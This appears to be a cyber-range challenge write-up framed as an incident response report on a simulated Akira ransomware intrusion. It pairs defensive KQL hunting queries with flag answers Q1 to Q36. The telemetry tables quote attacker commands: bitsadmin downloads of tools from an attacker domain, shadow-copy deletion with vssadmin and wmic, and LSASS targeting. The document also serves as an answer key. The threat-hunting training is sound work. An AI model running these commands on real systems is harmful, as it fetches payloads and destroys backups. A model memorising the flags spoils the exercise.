# The-BUYER

# 🔴 Incident Response Report — Akira Ransomware
### Ashford Sterling Recruitment | SancLogic Cyber Range — *The Buyer* (Advanced)

---

| Field | Detail |
|---|---|
| **Case Reference** | INC-2026-AKIRA-ASR |
| **Classification** | TLP:RED — Not for distribution |
| **Date** | 2026-01-27 / 2026-01-28 |
| **Affected Hosts** | AS-PC2, AS-SRV |
| **Victim ID** | 813R-QWJM-XKIJ |
| **Threat Actor** | Akira Ransomware Group |
| **Encrypted Extension** | `.akira` |

---

## Executive Summary

A ransomware affiliate operating under the **Akira** group returned to the Ashford Sterling Recruitment environment using pre-staged remote access established during a prior compromise (*The Broker*). The threat actor leveraged **AnyDesk**, deployed from `C:\Users\Public` on AS-PC2, to regain persistent access.

Over an approximately **80-minute operational window** on 27–28 January 2026, the attacker:
- Disabled Windows Defender via registry modification (`kill.bat`)
- Harvested credentials by targeting LSASS
- Moved laterally to AS-SRV using `as.srv.administrator`
- Exfiltrated a compressed data archive (`exfil_data.zip`)
- Deployed Akira ransomware masqueraded as `updater.exe`
- Wiped Volume Shadow Copies before encryption
- Dropped the ransom note at **22:18:33 UTC**

---

## Attack Timeline

| Time (UTC) | Host | Event |
|---|---|---|
| ~21:00 | AS-PC2 | AnyDesk executed from `C:\Users\Public` by `david.mitchell` |
| **21:03:42** | AS-PC2 | Registry modified — `DisableAntiSpyware` set via `kill.bat` |
| ~21:05 | AS-PC2 | LSASS targeted via `tasklist \| findstr lsass` |
| ~21:10 | AS-PC2 | Named pipe `\Device\NamedPipe\lsass` accessed |
| ~21:15 | AS-PC2 | `wsync.exe` (C2 beacon v1) deployed to `C:\ProgramData\` |
| ~21:20 | AS-PC2 | `scan.exe` deployed; enumeration of `10.1.0.154`, `10.1.0.183` |
| ~21:30 | AS-PC2 | `bitsadmin.exe` attempted download from `sync.cloud-endpoint.net` |
| ~21:35 | AS-PC2 | `Invoke-WebRequest` fallback; `wsync.exe` v2 beacon deployed |
| ~21:50 | AS-SRV | Lateral movement via `as.srv.administrator` |
| ~22:00 | AS-SRV | `st.exe` deployed; `exfil_data.zip` archive created |
| ~22:05 | AS-SRV | `updater.exe` (ransomware) staged by `powershell.exe` |
| ~22:10 | AS-SRV | `wmic shadowcopy delete` — VSS copies wiped |
| **22:18:33** | AS-SRV | Ransom note dropped by `updater.exe` — encryption commenced |
| ~22:20 | AS-SRV | `Clean.bat` executed — ransomware binary self-deleted |

---

## Section 1 — Ransom Note Analysis

The investigation began with the ransom note artifact left by the Akira ransomware deployment. Flags Q1–Q4 were extracted directly from the note and correlated with file event telemetry showing the note was dropped by `updater.exe` at 22:18:33 UTC.

### KQL Query

```kql
// SECTION 1: Ransom Note Analysis - Q1-Q4
// Indicators extracted directly from ransom note artifact
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName has "as-"
| where FileName has_any ("readme")
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName, DeviceName
| order by TimeGenerated desc
```

---

### 🚩 Q1 — Threat Actor `[Moderate]`

> **Answer:** `Akira`

The Akira ransomware group was identified from the ransom note header and consistent artefact naming (`akira_readme.txt`, `.akira` encrypted extension).

---

### 🚩 Q2 — Negotiation Portal `[Moderate]`

> **Answer:** `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion`

The TOR-based negotiation portal listed in the ransom note. This is the victim's sole contact point for Akira group communications. **Do not visit this address.**

---

### 🚩 Q3 — Victim ID `[Moderate]`

> **Answer:** `813R-QWJM-XKIJ`

Akira assigns a unique alphanumeric victim identifier used during the negotiation process. Preserve this for all incident records and insurance correspondence.

---

### 🚩 Q4 — Encrypted Extension `[Moderate]`

> **Answer:** `.akira`

Files encrypted by the ransomware had the `.akira` extension appended, consistent with the Akira variant's standard file marking behaviour.

---

## Section 2 — Infrastructure

Network event telemetry on AS-SRV was queried to map the attacker's external infrastructure. The `cloud-endpoint.net` domain served dual purpose as both payload delivery and ransomware staging. AnyDesk relay routing was also identified.

### KQL — Payload & Staging Domains (Q5, Q6)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-19) .. datetime(2026-02-27))
| where DeviceName == "as-srv"
| where ProcessCommandLine contains "http"
| project TimeGenerated, DeviceName, ProcessCommandLine

DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-19) .. datetime(2026-02-27))
| where DeviceName == "as-srv"
| where RemoteUrl != ""
| project TimeGenerated, DeviceName, RemoteUrl, RemoteIP,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

#### 📋 MDE Result — DeviceNetworkEvents: AS-SRV C2 domain connections
<img width="1311" height="439" alt="Screenshot 2026-03-18 at 09 51 29" src="https://github.com/user-attachments/assets/687241a1-a43b-4575-8e2b-80b52eafdf2f" />
---


### KQL — C2 IP Addresses (Q7)

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName == "as-srv"
| where RemoteUrl has_any ("sync.cloud-endpoint.net", "cdn.cloud-endpoint.net")
| project TimeGenerated, DeviceName, RemoteUrl, RemoteIP,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

### KQL — Remote Tool Relay (Q8)

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName == "as-srv"
| where RemoteUrl != "" and RemoteUrl contains "relay"
| project TimeGenerated, DeviceName, RemoteUrl, RemoteIP,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

#### 📋 MDE Result — AnyDesk relay domains on AS-SRV

<img width="1207" height="307" alt="Screenshot 2026-03-18 at 09 52 27" src="https://github.com/user-attachments/assets/4b9767fc-24f5-4ea4-bd7e-3bad5fbed14a" />

---
<img width="1207" height="122" alt="Screenshot 2026-03-18 at 09 57 07" src="https://github.com/user-attachments/assets/1c758aa7-a001-4939-a857-88101f9e2a83" />

---

### 🚩 Q5 — Payload Domain `[Moderate]`

> **Answer:** `sync.cloud-endpoint.net`

Tool downloads including `wsync.exe` and `scan.exe` originated from this domain. BitsAdmin was first attempted, with `Invoke-WebRequest` used as fallback.

---

### 🚩 Q6 — Ransomware Staging `[Moderate]`

> **Answer:** `cdn.cloud-endpoint.net`

The Akira ransomware binary (`updater.exe`) was staged via this CDN subdomain, part of the same attacker-controlled `cloud-endpoint.net` infrastructure.

---

### 🚩 Q7 — C2 IP Addresses `[Moderate]`

> **Answer:** `172.67.174.46, 104.21.30.237`

DNS resolution of the attacker's C2 domains returned these two IPs, consistent with Cloudflare-fronted infrastructure commonly used for evasion and resilience.

---

### 🚩 Q8 — Remote Tool Relay `[Moderate]`

> **Answer:** `relay-0b975d23.net.anydesk.com`

AnyDesk connections from AS-PC2 were routed through this relay domain. The attacker proxied remote desktop sessions through AnyDesk's relay network to obscure direct connectivity.

---

## Section 3 — Defense Evasion

Prior to payload deployment, the threat actor disabled Windows Defender through a batch script that modified a registry policy key. This is a standard Akira affiliate pre-encryption preparation step.

### KQL — Evasion Script Discovery (Q9, Q10)

```kql
DeviceFileEvents
| where TimeGenerated > ago(90d)
| where DeviceName in~ ("as-pc1", "as-pc2")
| where FileName endswith ".bat" or FileName endswith ".ps1" or FileName endswith ".cmd"
| where FolderPath has_any ("ProgramData", "Users\Public")
| where not(FileName startswith "__PSScriptPolicy")
| where not(FileName in~ ("pwncrypt.ps1","portscan.ps1","eicar.ps1","exfiltratedata.ps1"))
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

#### 📋 MDE Result — kill.bat discovered in C:\ProgramData\, initiated by wsync.exe

<img width="1301" height="89" alt="Screenshot 2026-03-18 at 10 02 01" src="https://github.com/user-attachments/assets/219b6fbe-95ff-4a57-bd9a-7b0d80fd08be" />

---

### KQL — Registry Tampering (Q11, Q12)

```kql
// Target key
DeviceRegistryEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName =~ "as-pc2"
| where RegistryValueName == "DisableAntiSpyware"
| order by TimeGenerated asc

// Broader Windows Defender key scope
DeviceRegistryEvents
| where TimeGenerated between (datetime(2026-01-27T18:00:00) .. datetime(2026-01-28T06:00:00))
| where DeviceName =~ "as-pc2"
| where RegistryKey contains "Windows Defender"
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, ActionType
| order by TimeGenerated desc
```

#### 📋 MDE Result — Windows Defender policy keys disabled on AS-PC2

<img width="1301" height="122" alt="Screenshot 2026-03-18 at 10 03 06" src="https://github.com/user-attachments/assets/fab9d999-c583-487d-bfae-f48acd8e2dde" />

---

### 🚩 Q9 — Evasion Script `[Hard]`

> **Answer:** `kill.bat`

`kill.bat` was identified in `DeviceFileEvents` telemetry executed from `C:\ProgramData\`. Its execution immediately preceded all registry modifications to Windows Defender policy.

---

### 🚩 Q10 — Evasion Hash `[Hard]`

> **Answer:** `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c`

SHA256 of `kill.bat`. Add to endpoint blocklists and EDR custom detections. ⚠️ Do not upload to VirusTotal.

---

### 🚩 Q11 — Registry Tampering `[Hard]`

> **Answer:** `DisableAntiSpyware`

The registry value `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware` was set to `1`, disabling Windows Defender real-time protection prior to tool deployment.

---

### 🚩 Q12 — Registry Timestamp `[Hard]`

> **Answer:** `21:03:42`

The registry modification was timestamped at 21:03:42 UTC on 2026-01-27, approximately 3 minutes after initial AnyDesk access was established on AS-PC2.

---

## Section 4 — Credential Access

The attacker targeted LSASS to harvest credentials for lateral movement. Process enumeration via `tasklist` was used to locate the LSASS process ID before accessing its named pipe.

### KQL — LSASS Targeting (Q13, Q14)

```kql
// Q13 - LSASS process hunt
DeviceProcessEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where ProcessCommandLine contains "tasklist" or ProcessCommandLine contains "Get-Process"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, FolderPath
| sort by TimeGenerated asc

// Q14 - Named pipe access
DeviceEvents
| where DeviceName in~ ("as-pc2")
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where ActionType == "NamedPipeEvent"
| extend PipeName = tostring(parse_json(AdditionalFields).PipeName)
| where PipeName has_any ("lsass")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, PipeName
```

#### 📋 MDE Result — `tasklist | findstr lsass` executed by wsync.exe (Q13)


<img width="1301" height="194" alt="Screenshot 2026-03-18 at 10 34 38" src="https://github.com/user-attachments/assets/41b5f6fd-2c5b-49e2-a316-1b0de19deed1" />


#### 📋 MDE Result — `\Device\NamedPipe\lsass` accessed (Q14)

<img width="774" height="301" alt="Screenshot 2026-03-18 at 10 36 19" src="https://github.com/user-attachments/assets/134bf53e-b9d7-42d1-a3b4-54999f7287e6" />

---

### 🚩 Q13 — Process Hunt `[Advanced]`

> **Answer:** `"tasklist | findstr lsass"`

The attacker piped `tasklist` output into `findstr` to locate the LSASS process — a standard pre-dump reconnaissance step. The initiating process was `wsync.exe`, confirming the C2 beacon was orchestrating credential theft activity.

---

### 🚩 Q14 — Credential Pipe `[Advanced]`

> **Answer:** `\Device\NamedPipe\lsass`

The LSASS named pipe was accessed during credential dumping activity, consistent with tools such as Mimikatz accessing LSASS through the Windows kernel device path.

---

## Section 5 — Initial Access

The threat actor returned to the environment using AnyDesk pre-staged during the prior *Broker* compromise. Execution from `C:\Users\Public` rather than its standard installation directory is a strong indicator of intentional staging.

### KQL — AnyDesk Execution, Attacker IP, and Compromised Account (Q15–Q18)

```kql
// Q15/Q16 - Tool and execution path
DeviceProcessEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where FileName =~ "AnyDesk.exe"
| project TimeGenerated, FileName, FolderPath, ProcessCommandLine
| sort by TimeGenerated

// Q17 - Attacker external IP
DeviceNetworkEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where InitiatingProcessFileName contains "nyDesk.exe"
| project TimeGenerated, DeviceName, RemoteIP, RemoteIPType, InitiatingProcessFileName

// Q18 - Compromised user account
DeviceNetworkEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where InitiatingProcessFileName =~ "AnyDesk.exe"
| project TimeGenerated, InitiatingProcessAccountName, RemoteIP
```

#### 📋 MDE Result — AnyDesk.exe executed from C:\Users\Public (Q15, Q16)

<img width="827" height="391" alt="Screenshot 2026-03-18 at 10 39 32" src="https://github.com/user-attachments/assets/c41a7bc3-e6b3-44ce-9fd4-fa0d69ee3eac" />


#### 📋 MDE Result — AnyDesk.exe external connections; attacker IP 88.97.164.155 (Q17)

<img width="991" height="451" alt="Screenshot 2026-03-18 at 10 40 19" src="https://github.com/user-attachments/assets/e51ce7ff-9f3b-415e-977d-828bff4d088c" />


#### 📋 MDE Result — Compromised account david.mitchell confirmed running AnyDesk (Q18)

<img width="731" height="451" alt="Screenshot 2026-03-18 at 10 41 30" src="https://github.com/user-attachments/assets/0383f052-7a2b-404e-8861-229d8d6562cd" />


---

### 🚩 Q15 — Remote Access Tool `[Hard]`

> **Answer:** `AnyDesk`

AnyDesk was identified as the pre-staged remote access tool used for re-entry, present from the prior Broker compromise and executed without reinstallation.

---

### 🚩 Q16 — Suspicious Execution Path `[Hard]`

> **Answer:** `C:\Users\Public`

AnyDesk was executed from `C:\Users\Public` rather than its standard program files path. This directory is accessible to all users without admin privileges and is commonly used by threat actors for tool pre-positioning.

---

### 🚩 Q17 — Attacker IP `[Hard]`

> **Answer:** `88.97.164.155`

Network events tied to the AnyDesk process on AS-PC2 identified `88.97.164.155` as the attacker's originating external IP. Search all SIEM logs for earlier activity from this address.

---

### 🚩 Q18 — Compromised User `[Hard]`

> **Answer:** `david.mitchell`

The AnyDesk session ran under the `david.mitchell` account. This account was the primary access vehicle on AS-PC2 and was subsequently used for all tool downloads and reconnaissance activity.

---

## Section 6 — Command & Control

The pre-staged C2 beacon from *The Broker* failed to maintain stable communications. The attacker deployed a replacement beacon (`wsync.exe`) to `C:\ProgramData\`, with two distinct hashes indicating a rebuild between deployments.

### KQL — C2 Beacon Analysis (Q19–Q22)

```kql
// Q19 - Identify new beacon deployed
DeviceFileEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where InitiatingProcessAccountName != "system"
| where FileName has ".exe"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessFileName,
          InitiatingProcessCommandLine

// Q20/Q21/Q22 - Location, original and replacement hashes
DeviceProcessEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where FileName == "wsync.exe"
| project TimeGenerated, DeviceName, FileName, FolderPath, ProcessCommandLine, SHA256
```

#### 📋 MDE Result — wsync.exe identified among dropped executables (Q19)

<img width="1109" height="466" alt="Screenshot 2026-03-18 at 10 42 46" src="https://github.com/user-attachments/assets/08440100-1c1f-493b-8821-27635bd48634" />


#### 📋 MDE Result — wsync.exe executions with SHA256 hashes (Q20, Q21, Q22)

<img width="1231" height="139" alt="Screenshot 2026-03-18 at 10 43 32" src="https://github.com/user-attachments/assets/35280037-f813-464b-a95b-89a0c9a234c9" />

---

### 🚩 Q19 — Primary Beacon `[Hard]`

> **Answer:** `wsync.exe`

`wsync.exe` was the replacement C2 beacon deployed after the original pre-staged beacon failed. The filename mimics Windows system binaries to blend with legitimate process names.

---

### 🚩 Q20 — Beacon Location `[Hard]`

> **Answer:** `C:\ProgramData\`

The beacon was written to `C:\ProgramData\`, a writable system directory accessible without administrator rights, commonly abused for tool staging.

---

### 🚩 Q21 — Beacon Hash (Original) `[Hard]`

> **Answer:** `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b`

SHA256 of the original `wsync.exe` deployment. This version failed and was subsequently replaced. ⚠️ Do not upload to VirusTotal.

---

### 🚩 Q22 — Beacon Hash (Replacement) `[Hard]`

> **Answer:** `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654`

SHA256 of the replacement `wsync.exe`. Two distinct hashes suggest a deliberate recompile to evade hash-based detection. ⚠️ Do not upload to VirusTotal.

---

## Section 7 — Reconnaissance

A portable network scanner (`scan.exe`) was deployed to identify live hosts and open shares. The attacker executed it with `/portable` to avoid traces in standard installation directories, directing output to the compromised user's Downloads folder.

### KQL — Network Scanner (Q23–Q26)

```kql
// Q23/Q24/Q25 - Scanner tool, hash, and execution arguments
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName == "as-pc2"
| where ProcessCommandLine has_any ("scan","ip","range","/s","/range")
| project TimeGenerated, FileName, ProcessCommandLine, AccountName
| sort by TimeGenerated

// Q26 - Internal IPs enumerated
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName has "as-srv"
| where FileName in ("cmd.exe","powershell.exe","net.exe","wmic.exe")
| where ProcessCommandLine has_any ("net view","\\")
| project TimeGenerated, DeviceName, ProcessCommandLine, AccountName, FileName
```

#### 📋 MDE Result — scan.exe execution with full arguments and bitsadmin download chain (Q23–Q25, Q28)


<img width="1273" height="292" alt="Screenshot 2026-03-18 at 10 48 19" src="https://github.com/user-attachments/assets/cad02c9c-cf9f-40a5-91cf-e16a1f5f1acc" />


#### 📋 MDE Result — net.exe share enumeration on AS-SRV (Q26, Q27)

<img width="883" height="141" alt="Screenshot 2026-03-18 at 10 48 55" src="https://github.com/user-attachments/assets/90d1452b-7bec-450c-a69b-a4091856b4ae" />


---

### 🚩 Q23 — Scanner Tool `[Moderate]`

> **Answer:** `scan.exe`

`scan.exe` was deployed to enumerate the internal network segment. Internally it extracted as Advanced IP Scanner (`advanced_ip_scanner.exe`), a commercial scanning utility commonly used by Akira affiliates.

---

### 🚩 Q24 — Scanner Hash `[Moderate]`

> **Answer:** `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b`

SHA256 of `scan.exe`. Retrospective searches using this hash across other endpoints can confirm the scanner's distribution scope. ⚠️ Do not upload to VirusTotal.

---

### 🚩 Q25 — Scanner Execution Arguments `[Moderate]`

> **Answer:** `/portable "C:/Users/david.mitchell/Downloads/" /lng en_us`

Portable mode with output directed to the compromised user's Downloads folder. Deliberate operator preference to avoid leaving scan artefacts in system directories.

---

### 🚩 Q26 — Network Enumeration Targets `[Moderate]`

> **Answer:** `10.1.0.154, 10.1.0.183`

These two internal IPs were targeted for share enumeration, corresponding to AS-PC2 and AS-SRV respectively. This network mapping directly preceded lateral movement to AS-SRV.

---

## Section 8 — Lateral Movement

Following credential harvesting and network enumeration, the attacker authenticated to AS-SRV using a local administrator credential, enabling full control of the file server.

### KQL — Lateral Movement Authentication (Q27)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName has "as-srv"
| where FileName in ("cmd.exe","powershell.exe","net.exe","wmic.exe")
| where ProcessCommandLine has_any ("net view","\\")
| project TimeGenerated, DeviceName, ProcessCommandLine, AccountName, FileName
```

> The `net view` results above (Section 7, Q26/Q27 table) confirm `as.srv.administrator` was the authenticated account on AS-SRV.

---

### 🚩 Q27 — Lateral Account `[Hard]`

> **Answer:** `as.srv.administrator`

The `as.srv.administrator` local administrator account was used to authenticate to AS-SRV. This credential was likely obtained via LSASS dumping or cached from the prior Broker compromise.

---

## Section 9 — Tool Transfer

The attacker used native Windows utilities (LOLBINs) to download tools from attacker-controlled infrastructure. BitsAdmin was first attempted; after encountering path issues, PowerShell's `Invoke-WebRequest` served as a fallback.

### KQL — Tool Download Methods (Q28, Q29)

```kql
// Q28 - LOLBIN bitsadmin first attempt
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName has "as-pc2"
| where AccountName == "david.mitchell"
| where ProcessCommandLine has_any ("http","https")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

// Q29 - PowerShell Invoke-WebRequest fallback
DeviceProcessEvents
| where DeviceName == "as-pc2"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where FileName =~ "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

#### 📋 MDE Result — Full bitsadmin download chain (Q28)

| TimeGenerated [UTC] | DeviceName | FileName | ProcessCommandLine |
|---|---|---|---|
| 1/27/2026, 8:14:03 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\Public\scan.exe` |
| 1/27/2026, 8:14:51 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` |
| 1/27/2026, 8:15:01 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` |
| 1/27/2026, 8:15:06 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe` |
| 1/27/2026, 8:16:32 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe` |
| 1/27/2026, 8:50:35 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/kill.bat C:\ProgramData\kill.bat` |

---

### 🚩 Q28 — Download Method `[Moderate]`

> **Answer:** `bitsadmin.exe`

BitsAdmin (Background Intelligent Transfer Service) was used first. It is a native Windows utility that blends with legitimate OS activity, commonly abused as a download LOLBin. Multiple path failures are visible in the telemetry before a successful download.

---

### 🚩 Q29 — Fallback Method `[Moderate]`

> **Answer:** `Invoke-WebRequest`

PowerShell's `Invoke-WebRequest` cmdlet was used after `bitsadmin` encountered issues. Trivially available on modern Windows systems and extremely common in living-off-the-land download chains.

---

## Section 10 — Exfiltration

Before deploying ransomware, the attacker staged and compressed data on AS-SRV using `st.exe`, producing `exfil_data.zip` for exfiltration. This **double-extortion** technique is a defining characteristic of Akira operations.

### KQL — Data Staging and Exfiltration Archive (Q30–Q32)

```kql
// Q30/Q31 - Staging tool and hash
DeviceFileEvents
| where DeviceName has "as-srv"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where FileName has "st.exe"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine,
          InitiatingProcessFileName, SHA256

// Q32 - Exfiltration archive
DeviceFileEvents
| where DeviceName has "as-srv"
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where FileName has_any ('.zip')
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine,
          InitiatingProcessFileName
```

#### 📋 MDE Result — st.exe staged on AS-SRV by powershell.exe (Q30, Q31)

| TimeGenerated [UTC] | DeviceName | FileName | InitiatingProcess | SHA256 |
|---|---|---|---|---|
| 1/27/2026, 10:24:08 PM | as-srv | **st.exe** | powershell.exe | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` |

#### 📋 MDE Result — File events on AS-SRV showing full staging chain (Q32)

| TimeGenerated [UTC] | DeviceName | FileName | InitiatingProcess |
|---|---|---|---|
| 1/27/2026, 10:24:09 PM | as-srv | **exfil_data.zip** | st.exe |
| 1/27/2026, 10:24:08 PM | as-srv | st.exe | powershell.exe |
| 1/27/2026, 10:20:28 PM | as-srv | updater.exe | cmd.exe |
| 1/27/2026, 10:15:53 PM | as-srv | updater.exe | powershell.exe |
| 1/27/2026, 10:15:17 PM | as-srv | wsync.exe | powershell.exe |
| 1/27/2026, 10:14:28 PM | as-srv | wsync.exe | powershell.exe |

---

### 🚩 Q30 — Staging Tool `[Hard]`

> **Answer:** `st.exe`

`st.exe` is the custom data staging and compression tool used to aggregate files prior to exfiltration. Deployed to AS-SRV and executed under the compromised administrator context.

---

### 🚩 Q31 — Staging Tool Hash `[Hard]`

> **Answer:** `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015`

SHA256 of `st.exe`. Treat as a custom attacker tool and immediately block across all endpoints via EDR custom indicator policies. ⚠️ Do not upload to VirusTotal.

---

### 🚩 Q32 — Exfiltration Archive `[Hard]`

> **Answer:** `exfil_data.zip`

`exfil_data.zip` was created by `st.exe` on AS-SRV. Forensic recovery of this file's contents is critical for determining data theft scope and informing regulatory breach notification obligations.

---

## Section 11 — Ransomware Deployment

Akira ransomware was deployed as `updater.exe` to disguise itself as a legitimate Windows update process. It was staged on AS-SRV by `powershell.exe`, deleted shadow copies, encrypted files, and dropped the ransom note at **22:18:33 UTC**.

### KQL — Ransomware Deployment (Q33–Q38)

```kql
// Q33/Q34 - Identify ransomware filename and hash
DeviceProcessEvents
| where DeviceName has "as-"
| where TimeGenerated >= datetime(2026-01-27 20:30:00)
| where FileName endswith ".exe"
| where FolderPath !startswith "C:\Windows"
| where FolderPath !startswith "C:\Program Files"
| summarize count() by FileName, FolderPath, SHA256, DeviceName
| order by count_ desc

// Q35 - Process that staged ransomware on AS-SRV
DeviceProcessEvents
| where DeviceName has "as-srv"
| where TimeGenerated >= datetime(2026-01-27 20:30:00)
| where FileName has "updater.exe"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessCommandLine

// Q36 - Shadow copy deletion
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName has "as-"
| where ProcessCommandLine has "delete"
| project TimeGenerated, FileName, ProcessCommandLine, AccountName, DeviceName
| order by TimeGenerated desc

// Q37/Q38 - Ransom note drop and encryption timestamp
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-26) .. datetime(2026-01-28))
| where DeviceName has "as-"
| where FileName has_any ("readme")
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName, DeviceName
| order by TimeGenerated desc
```

#### 📋 MDE Result — Non-standard process summary; updater.exe identified (Q33, Q34)

| FileName | FolderPath | SHA256 (truncated) | DeviceName | count |
|---|---|---|---|---|
| wsync.exe | C:\ProgramData\wsync.exe | `0072ca0d0adc9a1b2e16...` | as-srv | 2 |
| RuntimeBroker.exe | C:\Users\Public\RuntimeBroker.exe | `48b97fd91946e81e3e77...` | as-srv | 2 |
| AnyDesk.exe | C:\Users\Public\AnyDesk.exe | `f42b635d93720d1624c7...` | as-pc1 | 2 |
| st.exe | C:\ProgramData\st.exe | `512a1f4ed9f512572608...` | as-srv | 1 |
| **updater.exe** | **C:\ProgramData\updater.exe** | **`e609d070ee9f76934d73...`** | **as-srv** | **1** |

#### 📋 MDE Result — updater.exe staged on AS-SRV by powershell.exe (Q35)

| TimeGenerated [UTC] | DeviceName | FileName | ProcessCommandLine | InitiatingProcessCommandLine |
|---|---|---|---|---|
| 1/27/2026, 10:18:29 PM | as-srv | updater.exe | "updater.exe" | **"powershell.exe"** |

#### 📋 MDE Result — Shadow copy deletion commands (Q36)

| TimeGenerated [UTC] | FileName | ProcessCommandLine | AccountName | DeviceName |
|---|---|---|---|---|
| 1/27/2026, 9:09:11 PM | WMIC.exe | `wmic shadowcopy delete` | david.mitchell | as-pc2 |
| 1/27/2026, 9:09:11 PM | cmd.exe | `cmd.exe /c "wmic shadowcopy delete"` | david.mitchell | as-pc2 |
| 1/27/2026, 9:09:10 PM | vssadmin.exe | `vssadmin delete shadows /all /quiet` | david.mitchell | as-pc2 |
| 1/27/2026, 9:09:10 PM | cmd.exe | `cmd.exe /c "vssadmin delete shadows /all /quiet"` | david.mitchell | as-pc2 |

#### 📋 MDE Result — akira_readme.txt dropped by updater.exe at 22:18:33 UTC (Q37, Q38)

| TimeGenerated [UTC] | FileName | FolderPath | InitiatingProcess | DeviceName |
|---|---|---|---|---|
| 1/27/2026, 10:22:15 PM | akira_readme.lnk | C:\Users\AS.SRV.Administrator\AppData\Roaming\Microsoft\W... | explorer.exe | as-srv |
| 1/27/2026, 10:18:34 PM | akira_readme.txt | C:\Users\AS.SRV.Administrator\Desktop\ | updater.exe | as-srv |
| **1/27/2026, 10:18:33 PM** | **akira_readme.txt** | **C:\Users\AS.SRV.Administrator\Downloads\** | **updater.exe** | **as-srv** |
| 1/27/2026, 10:18:33 PM | akira_readme.txt | C:\Users\AS.SRV.Administrator\Documents\ | updater.exe | as-srv |
| 1/27/2026, 10:18:33 PM | akira_readme.txt | C:\Users\AS.SRV.Administrator\Desktop\ | updater.exe | as-srv |

---

### 🚩 Q33 — Ransomware Filename `[Advanced]`

> **Answer:** `updater.exe`

Masqueraded as a legitimate Windows update executable. Designed to delay detection if an analyst casually reviews running processes during incident response.

---

### 🚩 Q34 — Ransomware Hash `[Advanced]`

> **Answer:** `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b`

SHA256 of the Akira ransomware binary. Block at EDR and network perimeter immediately. ⚠️ Do not upload to VirusTotal.

---

### 🚩 Q35 — Ransomware Staging Process `[Advanced]`

> **Answer:** `powershell.exe`

`powershell.exe` was the parent process responsible for writing `updater.exe` to disk on AS-SRV, confirming automated post-exploitation chain delivery.

---

### 🚩 Q36 — Recovery Prevention `[Advanced]`

> **Answer:** `wmic shadowcopy delete`

